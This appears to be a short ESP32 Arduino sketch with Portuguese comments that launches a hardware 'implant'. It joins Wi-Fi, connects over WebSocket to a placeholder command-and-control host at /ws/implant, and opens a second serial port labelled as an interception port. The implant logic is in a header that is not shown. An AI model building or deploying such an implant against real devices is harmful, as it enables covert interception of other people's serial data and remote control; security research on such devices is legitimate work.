#include <Arduino.h>
#include "ImplantCore.h"

// Configurações do seu Servidor Web de Pesquisa
const char* WIFI_SSID = "Research_Network";
const char* WIFI_PASS = "secure_password";
const char* WS_HOST   = "seu-servidor-c2.com";
const uint16_t WS_PORT = 8080;
const char* WS_URL    = "/ws/implant";

ESP32Implant implant(WS_HOST, WS_PORT, WS_URL);

void setup() {
    Serial.begin(115200);   // Console de Debug
    Serial2.begin(9600);    // Porta de Interceptação (TX2=17, RX2=16)
    
    WiFi.begin(WIFI_SSID, WIFI_PASS);
    while (WiFi.status() != WL_CONNECTED) {
        delay(500);
    }

    implant.begin();
}

void loop() {
    implant.update();
}